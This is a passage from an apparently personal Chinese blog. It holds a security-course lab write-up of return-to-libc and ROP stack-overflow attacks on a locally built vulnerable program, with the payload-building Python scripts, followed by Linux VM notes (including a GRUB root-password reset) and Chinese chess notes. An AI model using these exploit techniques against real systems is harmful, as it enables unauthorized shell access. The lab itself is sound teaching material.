+<p><strong>returntolibc步骤：</strong></p>
+<ol>
+<li><p>首先编译有漏洞的程序，编译的时候增加选项，打开不可执行栈，关闭stackguard，关闭地址随机化。命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z noexecstack -o stack returntolibc_stack.c</span><br><span class="line"><span class="meta">#</span><span class="bash">或者gcc -fno-stack-protector -z noexecstack -g -o s_gdb returntolibc_stack.c 编译生成可调试的s_gdb程序</span></span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure></li>
+<li><p>使用gdb调试s_gdb程序，并找到system函数和exit函数的地址，命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ./s_gdb</span><br><span class="line">run</span><br><span class="line">p system</span><br><span class="line">p exit</span><br></pre></td></tr></table></figure>
+
+<p>结果如下图：</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc1.png"></p>
+</li>
+<li><p>使用断点功能找到进入后的ebp和buffer起始地址，计算出我们需要填充的参数的相对位置，使用<code>gdb ./s_gdb</code>进入可调试程序，使用<code>b vulfunc</code>设下断点，使用<code>run</code>执行程序到断点处停下，使用<code>p $ebp</code> <code>p &amp;buffer</code>来查看ebp寄存器中存的ebp的地址以及分配给buffer的首地址，两者相减得到33是栈中存ebp的地址块首地址到buffer首地址的距离。如下图所示：</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc4.png"></p>
+</li>
+<li><p>接着编写一个新的程序用来获取环境变量的地址，使用<code>gcc envraddr.c -o envraddr</code>编译它，使用<code>export MYSHELL=&quot;/bin/sh&quot;</code>将环境变量MYSHELL设置为”/bin/bash”字符串，使用<code>./envraddr</code>指令执行它。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//getenv用来获取MYSHELL环境变量的值（环境变量存的路径）和环境变量所在地址</span></span><br><span class="line">	<span class="keyword">char</span> *shell = (<span class="keyword">char</span> *)getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(shell)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;   Value: %s\n&quot;</span>, shell);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; Address: %x\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)shell);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; MYSHELL not found\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下图，可知我们环境变量的地址是0xbfffe18，也就是我们所需要的”/bin/sh”字符串的地址.</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc2.png"></p>
+</li>
+<li><p>接下来需要将相关参数填充栈，从ebp依次栈底填充的内容是：system的地址、exit的地址、”/bin/sh”字符串的地址。编写python脚本实现这个功能：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with none zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>))</span><br><span class="line"></span><br><span class="line">a3 = <span class="number">0xb7ec582b</span> <span class="comment"># address of &quot;/bin/sh&quot;</span></span><br><span class="line">content[<span class="number">45</span>:<span class="number">49</span>] = (a3).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">0xb7d989d0</span> <span class="comment"># address of exit()</span></span><br><span class="line">content[<span class="number">41</span>:<span class="number">45</span>] = (a2).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a1 = <span class="number">0xb7da4da0</span> <span class="comment"># address of system()</span></span><br><span class="line">content[<span class="number">37</span>:<span class="number">41</span>] = (a1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file.write(content)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure></li>
+<li><p>最后我们执行python脚本就可以把恶意输入填充到badfile里，接着运行我们有漏洞的程序就可以实现攻击。</p>
+</li>
+<li><p>出现了一点问题，攻击没有反应，我们只能换个”/bin/sh”字符串地址来试试，我们尝试在gdb运行漏洞程序的时候（先在main函数处加断点，再run）加载在内存中查找字符串，使用命令<code>searchmem &quot;/bin/sh&quot;</code>，查找的结果如图所示，用新的地址替换python程序中的地址，再次尝试。</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc5.png"></p>
+</li>
+<li><p>终于成功了，结果如下，成功出现了新的shell输入端。</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc6.png"></p>
+</li>
+</ol>
+<p><strong>ROP步骤：</strong></p>
+<p>当我们遇到没有加载动态链接库的程序时，或者程序本身没有调用system等系统函数时，我们就无法使用returntolibc完成攻击了，这个时候可以使用rop。</p>
+<ol>
+<li><p>首先安装ROPgadget工具，它可以自动化生产gadget链</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">使用pip安装ROP gadget依赖capstone</span></span><br><span class="line">sudo pip install capstone</span><br><span class="line"><span class="meta">#</span><span class="bash">使用pip安装ROPgadget</span></span><br><span class="line">sudo pip install ROPgadget</span><br></pre></td></tr></table></figure></li>
+<li><p>使用如下命令编译漏洞程序，注意打开地址随机化</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z noexecstack -static -g -o stack returntolibc_stack.c  #记得加static参数</span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=2 #打开地址随机化</span><br></pre></td></tr></table></figure></li>
+<li><p>使用命令<code>ROPgadget --binary ./stack --ropchain</code>生成gadget链</p>
+<p>结果如下：</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop1.png"></p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop2.png"></p>
+</li>
+<li><p>接下来我们要确定偏移地址，好把我们的gadget填充进去。进入gdb调试程序，使用<code>pattern_create 100</code>生成100个字符的随机测试字符串，再另开一个终端使用<code>echo &#39;我们的字符串&#39; &gt; badfile</code>，再<code>run</code>执行程序，我们可以看到出现了段错误，程序崩溃，此时EIP的值为0x41614141，内容是我们填充进去的’AAaA’.使用命令<code>pattern_offset 0x41614141</code>，可以得到EIP处的偏移为37，如下图2所示：</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop3.png"></p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop4.png"></p>
+</li>
+<li><p>接着我们编写python程序，将我们的填充字符串以及gadget的利用写好输出到badfile中，其中gadget的利用我们的工具已经帮我们把python代码写好了，我们把计算出来的偏移地址之前的位置填充成37个’a’字符。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p += <span class="number">37</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8836</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805492b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b8836</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805492b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049333</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0805492b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080defc9</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806ef2b</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049333</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0804f0b3</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cb25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="built_in">print</span> p</span><br></pre></td></tr></table></figure></li>
+<li><p>使用命令<code>python exploit.py &gt; badfile</code>完成恶意输入文件的构建，使用命令<code>./stack</code>运行我们的漏洞程序，可以看到攻击成功，新开了一个shell输入端。</p>
+<p><img src="%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Crop5.png"></p>
+</li>
+</ol>
+<blockquote>
+<p>寻找溢出偏移的参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35544379/article/details/104984164">https://blog.csdn.net/qq_35544379/article/details/104984164</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/04/12/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" data-id="ckr5o9zyo000txkurgaw46ibd" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/gdb/" rel="tag">gdb</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-linux" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/03/01/linux/" class="article-date">
+  <time datetime="2021-03-01T12:23:05.000Z" itemprop="datePublished">2021-03-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/">虚拟机</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/03/01/linux/">linux虚拟机杂记</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="su和sudo"><a href="#su和sudo" class="headerlink" title="su和sudo"></a>su和sudo</h3><p>su:切换用户</p>
+<p>sudo:权限有针对性地下放，即su切换到root后以root身份执行命令，而后退出</p>
+<blockquote>
+<p>第一次登陆Ubuntu的时候root还没有设置密码，故无法切换，使用<code>sudo passwd root</code>命令设置密码</p>
+</blockquote>
+<h3 id="虚拟机的iso镜像文件"><a href="#虚拟机的iso镜像文件" class="headerlink" title="虚拟机的iso镜像文件"></a>虚拟机的iso镜像文件</h3><p>每个虚拟机都有自己的磁盘文件(.vmdk)，这些磁盘文件就是<strong>虚拟的硬盘</strong>。安装虚拟机时运行镜像里的安装程序，这程序的主要任务只不过是把镜像里的东西解压到磁盘文件里，不会修改镜像里的内容。等到虚拟机安装完，这镜像就用不着了。所以倘若有现成的虚拟硬盘，也不需要镜像文件了。</p>
+<p>vmware会寻找.vmx文件，然后会去找.vmdk文件，若只有.vmdk文件则需要创建新虚拟机，在选择磁盘的时候选择该.vmdk文件即可。因此，磁盘文件和镜像文件并不一定要在同一个文件夹里。</p>
+<h3 id="虚拟机三个网络模式"><a href="#虚拟机三个网络模式" class="headerlink" title="虚拟机三个网络模式"></a>虚拟机三个网络模式</h3><p>vmware会为虚拟机创建虚拟网络，命名为VMnet0…等等，每个虚拟网络可以连接若干网络设备</p>
+<ul>
+<li><p>桥接模式</p>
+<p>桥接模式下VMware虚拟出来的操作系统就像是局域网中一台独立的主机，它可以访问任何一台机器。桥接模式下往往需要为虚拟主机配置IP、掩码等（虚拟IP和主机ip要在同一网段）。</p>
+</li>
+<li><p>NAT模式</p>
+<p>顾名思义，NAT是Network Address Translation的缩写，意为网络地址转换。使用NAT的虚拟系统<strong>把主机当作路由器</strong>访问互联网，虚拟系统网络连接时，VMware会在主机上建立单独的专用网络用以主机和虚拟机相互通信。虚拟系统往外部发送数据包时都用会先发给主机，再由主机标记后发往其他地方，接收数据包也一样，因此虚拟主机在外部网络中没有自己的ip地址，而外部网络主机也无法访问虚拟机。</p>
+<p>此外，在一台主机上只允许有一个NAT模式的虚拟网络，因此，同一台主机上的多个采用NAT模式的虚拟机也是可以相互访问的。</p>
+</li>
+<li><p>主机模式</p>
+<p>主机模式下，真实环境和虚拟环境是隔离开的，在这种模式下，主机无法和虚拟机通信，而虚拟机之间是可以通信的。</p>
+</li>
+</ul>
+<h3 id="kali开机密码重设"><a href="#kali开机密码重设" class="headerlink" title="kali开机密码重设"></a>kali开机密码重设</h3><p>现在密码这么多经常不用总是会忘记哒，这不开学要用kali做实验发现密码整忘喽，记录一下重设过程下次忘记能快速完成重设。<del>下次还敢</del></p>
+<ol>
+<li><p>首先重启虚拟机，出现GNU GRUB引导菜单时，按下方向键选择恢复模式（recovery mode），按e进入编辑模式（或者直接选择advanced条目直接按e不按enter）</p>
+</li>
+<li><p>进入编辑模式后，将linux行的ro修改为rw，删除后面的quiet spash，添加init=/bin/bash，如图</p>
+<p><img src="linux%5Ckali%E9%87%8D%E8%AE%BE1.png"></p>
+<p><img src="linux%5Ckali%E9%87%8D%E8%AE%BE2.png"></p>
+</li>
+<li><p>修改完成按ctrl+x继续启动</p>
+</li>
+<li><p>启动完成会出现命令行，输入<code>passwd root</code>，接着输入重设的密码即可（记录一下这次设置的用户名和密码都是root）</p>
+</li>
+<li><p>接着直接重启强制重启（vm里）即可</p>
+</li>
+</ol>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul>
+<li><code>dpkg -L package_name</code>列出属于包package_name的所有文件（用于找包的位置）</li>
+<li></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/03/01/linux/" data-id="ckr5o9zyh000dxkur7h6g14y5" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" rel="tag">虚拟机</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-开局要领" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/02/26/%E5%BC%80%E5%B1%80%E8%A6%81%E9%A2%86/" class="article-date">
+  <time datetime="2021-02-26T09:45:42.000Z" itemprop="datePublished">2021-02-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/">中国象棋</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/02/26/%E5%BC%80%E5%B1%80%E8%A6%81%E9%A2%86/">开局要领</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="中炮局"><a href="#中炮局" class="headerlink" title="中炮局"></a>中炮局</h2><p>将炮移动到中间开局，此时对方需要跳马照卒，防止对方的炮打过来。</p>
+<ol>
+<li>尽量出大子，如车；防止频繁的走动某一个子，不利棋局布置</li>
+<li>抢占重要据点，如车占我方河线（巡河车）</li>
+<li>均衡发展左右两边子力</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://imane219.github.io/project/2021/02/26/%E5%BC%80%E5%B1%80%E8%A6%81%E9%A2%86/" data-id="ckr5o9zyv0010xkur3ex39sk6" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/project/tags/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/" rel="tag">中国象棋</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-基本杀法" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/" class="article-date">
+  <time datetime="2021-02-25T12:38:59.000Z" itemprop="datePublished">2021-02-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/project/categories/%E4%B8%AD%E5%9B%BD%E8%B1%A1%E6%A3%8B/">中国象棋</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/project/2021/02/25/%E5%9F%BA%E6%9C%AC%E6%9D%80%E6%B3%95/">基本杀法</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="入门杀法"><a href="#入门杀法" class="headerlink" title="入门杀法"></a>入门杀法</h2><h3 id="双车错"><a href="#双车错" class="headerlink" title="双车错"></a>双车错</h3><p>两个车将军时，一个车占据田字格的中路，另一个车把对方的将逼至上路(左路)或下路(右路)，形成绝杀</p>
+<blockquote>
+<p> 注意保证车不要被将吃</p>
+</blockquote>
+<p><img src="%E5%8F%8C%E8%BD%A6%E9%94%99.png" alt="双车错"></p>
+<h3 id="重炮杀"><a href="#重炮杀" class="headerlink" title="重炮杀"></a>重炮杀</h3><p>条件1：两个炮在一条直线上将军，炮和将之间无子阻隔（这样就没办法通过垫子解决）</p>
+<p>条件2：将无法左右移动（有子拦住或者该处正被将军，比如被马踩着）</p>
+<p><img src="%E9%87%8D%E7%82%AE%E6%9D%80.png" alt="重炮杀"></p>
+<h3 id="马后炮"><a href="#马后炮" class="headerlink" title="马后炮"></a>马后炮</h3><p>条件1：马和对方将在同一条线上且中间空一格（不能隔子）</p>
+<p>条件2：炮在马后且可以打到将（炮马之间无子）</p>
+<p>这样马控制将不能往两边走，炮控制将不能前进或后退</p>
+<p><img src="%E9%A9%AC%E5%90%8E%E7%82%AE.png" alt="马后炮"></p>
+<h3 id="天地炮"><a href="#天地炮" class="headerlink" title="天地炮"></a>天地炮</h3><p>一炮在中路，和对方的将中间隔着士和象，此时该炮压制住了士象，使之无法离开；另一炮在底线形成将军<strong>或者</strong>压制另一对士象借助车马兵将军，其中一炮压制士象，采用其他方式将军也称铁门栓（具体见基础杀法）</p>
+<p>例1：一炮压制士象，另一炮底线将军。</p>
+<p><img src="%E5%A4%A9%E5%9C%B0%E7%82%AE1.png" alt="天地炮"></p>
+<p>例2：车可以吃掉炮线上的士而此时将不能吃车（否则被炮将军），将又被车将军且无法移动。</p>
+<p><img src="%E5%A4%A9%E5%9C%B0%E7%82%AE2.png" alt="天地炮"></p>
+<h2 id="基础杀法"><a href="#基础杀法" class="headerlink" title="基础杀法"></a>基础杀法</h2><h3 id="卧槽马"><a href="#卧槽马" class="headerlink" title="卧槽马"></a>卧槽马</h3><p>槽点即九宫格中心点左边（右边）两格的位置，当马跳到此处时，可以踩将。</p>
+<p>此时解法仅有：1.杀马 2.蹩马腿 3.移动将</p>
+<p>当解法均不可满足时形成绝杀。由于士象没有办法蹩卧槽马的腿和杀马，故在没有防备时仅能移动将，配合其他子可杀。</p>
+<p>例1：当卧槽后将移动到九宫格中心，形成了马后炮的马部分，就可配合马后炮杀将。</p>
+<p><img src="%E5%8D%A7%E6%A7%BD%E9%A9%AC.png" alt="卧槽马"></p>
+<h3 id="挂角马"><a href="#挂角马" class="headerlink" title="挂角马"></a>挂角马</h3><p>即马走到士角的位置，即将踩将。</p>
+<p>和卧槽马一样，此时解法仅有：1.杀马 2.蹩马腿 3.移动将。</p>
+<p>而挂角马多一种被士杀的危险，当士不在中间或者士被炮控制住无法移动时就可以使用。</p>
+<p>例1：和卧槽马一样，挂角马也可以控制两个点，是将点和将点的对格点。可以用挂角马把将逼离将点之后，用其他子将军，用对格点保护其他子。（对格点可以被象蹩腿）</p>
+<p><img src="%E6%8C%82%E8%A7%92%E9%A9%AC.png" alt="挂角马"></p>
+<h3 id="闷杀"><a href="#闷杀" class="headerlink" title="闷杀"></a>闷杀</h3><p>对方将被自己的其他子堵住时进兵绝杀。</p>
+<p>例1：炮打闭功，炮在底线将军，此时若没法<strong>填子</strong>也没法<strong>挪开炮架子</strong>也没法<strong>上移将</strong>，则是闭功</p>
+<p><img src="%E9%97%B7%E6%9D%801.png" alt="闷杀"></p>
+<p>例2：当对方的子挡住将中路时，车杀其另一条路即可，此时效果类似于双车错。</p>
+<p><img src="%E9%97%B7%E6%9D%802.png" alt="闷杀"></p>
+<p>例3：如下图，首先不能在肋线（4、6路）上将军，下有车可以吃子，对方车和将一个吃兵一个吃车就没有杀招了；其次不能在将点将军（即进车吃黑车），这样会被将吃；那么只能下兵，且要先把将堵在此时位置，即需要另一个子填住象眼处，既能防止飞象吃兵也能进行闷杀。故红车左移将军，黑车势必下来吃红车，进兵将军形成闷杀。</p>
+<p><img src="%E9%97%B7%E6%9D%803.png" alt="闷杀"></p>
+<p>例4：如下图，跳马可用炮将军，但对方炮可以上移动，故先用马跳到炮上堵住炮，即形成闷杀。</p>
+<p><img src="%E9%97%B7%E6%9D%804.png" alt="闷杀"></p>
+<h3 id="铁门栓"><a href="#铁门栓" class="headerlink" title="铁门栓"></a>铁门栓</h3><p>铁门栓指中路士象被炮控制，从而士点象点安全可以用来将军。</p>
+<p>例1： 如图，可以分析不能在底线将军，则花费左车吃中士，此时角士只能下来，从而让出将路，进车配合红帅杀将。</p>
+<p><img src="%E9%93%81%E9%97%A8%E6%A0%931.png" alt="铁门栓"></p>
+<p>例2：如图，我们通常采用马或者帅<strong>照着对方士点</strong>，配合车或者兵在被照着的士点上杀将。</p>
+<p><img src="%E9%93%81%E9%97%A8%E6%A0%932.png" alt="铁门栓"></p>
+<h3 id="大刀剜心"><a href="#大刀剜心" class="headerlink" title="大刀剜心"></a>大刀剜心</h3><p>车或兵配合其他的子吃掉花心士形成绝杀。</p>
+<p>条件1：保证车不被吃掉，如无法上士（另一车在底线将军<strong>或</strong>炮控制着底线士象）,将无法上来吃掉车（炮在中路照着或者有马照车等等）</p>
